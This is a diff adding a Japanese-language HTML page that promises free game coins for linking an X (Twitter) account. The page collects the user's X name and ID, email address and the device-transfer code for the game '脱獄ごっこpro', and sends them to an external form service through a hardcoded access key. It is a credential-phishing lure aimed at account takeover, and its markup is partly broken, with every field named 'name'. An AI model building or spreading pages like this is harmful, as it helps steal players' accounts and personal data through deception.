@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>サイトにX（旧Twitter）をリンクすると無償コインをギフト！！</title>
+    <link rel="stylesheet" href="style.css" />
+  </head>
+  <body>
+<div class="contact-form">
+    <p class="title">X（旧Twitter）をリンクして無償コインを受け取ろう！！</p>
+<form action="https://api.staticforms.xyz/submit" method="post">
+      <input type="hidden" name="accessKey" value="ea6f8d5d-1c13-4974-ae84-d3877569f399">
+ <input type="hidden" name="subject" value="Test">
+      <div class="item">
+        <label class="label">X (Twitter)内での名前</label>
+ <input type="text" class="inputs" name="name" required/>
+      </div>
+
+<input type="hidden" name="subject" value="Test">
+      <div class="item">
+        <label class="label">X (Twitter） ID</label>
+ <input type="text" class="inputs" name="name" required/>
+      </div>
+
+<input type="hidden" name="subject" value="Test">
+      <div class="item">
+        <label class="label">メールアドレス</label>
+ <input type="text" class="inputs" name="name" required/>
+      </div>
+
+<input type="hidden" name="subject" value="Test">
+      <div class="item">
+        <label class="label">脱獄ごっこpro機種変コード</label>
+ <input type="text" class="inputs" name="name" required/>
+      </div>
+
+<input type="hidden" name="subject" value="Test">
+      <div class="item">
+        <label class="label">欲しい無償コイン数</label>
+ <input type="text" class="inputs" name="name" required/>
+      </div>
+
+
+<input type="hidden" name="subject" value="Test">
+      <div class="item">
+        <label class="label">注意事項 </label>
+
+<input type="hidden" name="subject" value="Test">
+      <div class="item">
+        <label class="label">
+反映には時間がかかる可能性があります </label>
+
+
+<div class="button-area">
+          <input type="submit" value="予約決定" />
+          <input type="reset" value="リセット" />
+
+
+
+        </div>
+      </div>
